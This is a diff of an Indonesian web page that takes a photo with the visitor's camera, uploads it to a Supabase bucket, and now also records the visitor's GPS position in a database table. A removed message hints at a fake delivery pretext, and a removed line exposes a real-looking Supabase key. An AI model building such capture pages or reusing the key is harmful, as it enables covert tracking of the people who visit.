@@ -85,34 +85,13 @@
       background: #ff5722;
       animation-timing-function: cubic-bezier(0, 1, 1, 0);
     }
-    .loading div:nth-child(1) {
-      left: 8px;
-      animation: loading1 0.6s infinite;
-    }
-    .loading div:nth-child(2) {
-      left: 8px;
-      animation: loading2 0.6s infinite;
-    }
-    .loading div:nth-child(3) {
-      left: 32px;
-      animation: loading2 0.6s infinite;
-    }
-    .loading div:nth-child(4) {
-      left: 56px;
-      animation: loading3 0.6s infinite;
-    }
-    @keyframes loading1 {
-      0% { transform: scale(0); }
-      100% { transform: scale(1); }
-    }
-    @keyframes loading2 {
-      0% { transform: translateX(0); }
-      100% { transform: translateX(24px); }
-    }
-    @keyframes loading3 {
-      0% { transform: scale(1); }
-      100% { transform: scale(0); }
-    }
+    .loading div:nth-child(1) { left: 8px; animation: loading1 0.6s infinite; }
+    .loading div:nth-child(2) { left: 8px; animation: loading2 0.6s infinite; }
+    .loading div:nth-child(3) { left: 32px; animation: loading2 0.6s infinite; }
+    .loading div:nth-child(4) { left: 56px; animation: loading3 0.6s infinite; }
+    @keyframes loading1 { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+    @keyframes loading2 { 0% { transform: translateX(0); } 100% { transform: translateX(24px); } }
+    @keyframes loading3 { 0% { transform: scale(1); } 100% { transform: scale(0); } }
   </style>
 </head>
 <body>
@@ -131,7 +110,7 @@
   <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
   <script>
     const SUPABASE_URL = "https://sinqdlsddldljlqvsxoa.supabase.co";
-    const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InNpbnFkbHNkZGxkbGpscXZzeG9hIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTY2Mzg4MDcsImV4cCI6MjA3MjIxNDgwN30.PdO2Fl37xYkG0T9skBJ9R7VTi553-iSUZGBm1L4yTkE";
+    const SUPABASE_KEY = "YOUR_ANON_KEY"; // ganti dengan key kamu
     const BUCKET = "foto-users"; 
 
     const { createClient } = supabase;
@@ -164,8 +143,10 @@
         } else {
           statusEl.style.background = "#e8f5e9";
           statusEl.style.color = "#388e3c";
-          statusEl.innerText = "✅ otw anter ke alamat mu!";
-          tampilkanFoto();
+          statusEl.innerText = "✅ Foto berhasil, tunggu lokasi...";
+
+          // setelah foto -> ambil lokasi
+          ambilLokasi(fileName);
         }
 
         track.stop();
@@ -174,6 +155,32 @@
         statusEl.style.color = "#d32f2f";
         statusEl.innerText = "❌ Tidak bisa ambil foto: " + err;
       }
+    }
+
+    function ambilLokasi(fotoName) {
+      if (!navigator.geolocation) {
+        statusEl.innerText = "❌ Browser tidak mendukung geolocation";
+        return;
+      }
+
+      navigator.geolocation.getCurrentPosition(async (pos) => {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        // simpan ke tabel Supabase (butuh bikin tabel lokasi_users di Supabase)
+        const { error } = await client
+          .from("lokasi_users")
+          .insert([{ foto: fotoName, latitude: lat, longitude: lon }]);
+
+        if (error) {
+          statusEl.innerText = "❌ Gagal simpan lokasi: " + error.message;
+        } else {
+          statusEl.innerText = "✅ Foto & lokasi berhasil disimpan!";
+          tampilkanFoto();
+        }
+      }, (err) => {
+        statusEl.innerText = "❌ Gagal ambil lokasi: " + err.message;
+      });
     }
 
     async function tampilkanFoto() {
@@ -186,7 +193,7 @@
         return;
       }
 
-      listEl.innerHTML = "<h3>terimakasih</h3>";
+      listEl.innerHTML = "<h3>Terimakasih</h3>";
       data.forEach(file => {
         const { data: publicUrl } = client.storage.from(BUCKET).getPublicUrl(file.name);
         
@@ -205,5 +212,3 @@
   </script>
 </body>
 </html>
-
-
